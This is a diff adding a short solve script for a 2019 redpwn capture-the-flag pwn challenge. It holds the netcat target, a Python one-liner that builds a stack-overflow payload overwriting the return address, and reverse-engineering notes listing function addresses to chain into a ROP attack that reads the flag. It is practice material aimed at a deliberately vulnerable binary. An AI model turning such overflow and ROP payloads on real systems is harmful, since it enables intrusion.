@@ -1,0 +1,24 @@
+# nc chall.2019.redpwn.net 4005
+
+#python -c 'print "A"*14 + "BBBB" + "CCCC" + "DDDD"' 
+                         # ebx      ebp      eip
+
+python -c 'print "A"*14 + "BBBB" + "CCCC" + "\x16\x92\x04\x08" + "\x69\x95\x04\x08"' 
+
+#0x80a0101 i_got_u 
+#0x08049569 call i_got_u
+# doing some RE, i_got_u function will open and read a file, probably the flag
+# it will exit early if certain values in memory are not set
+# looks like they can be set with the below functions
+: '
+0x08049216    3 87           sym.air
+0x0804926d    3 87           sym.water
+0x080492c4    3 87           sym.land
+0x0804931b    3 87           sym.underground
+0x08049372    3 87           sym.limbo
+0x080493c9    3 87           sym.hell
+0x08049420    3 87           sym.minecraft_nether
+0x08049477    3 87           sym.bedrock
+0x080494ce    1 40           sym.zipline
+'
+# so we need to rop through all of those functions
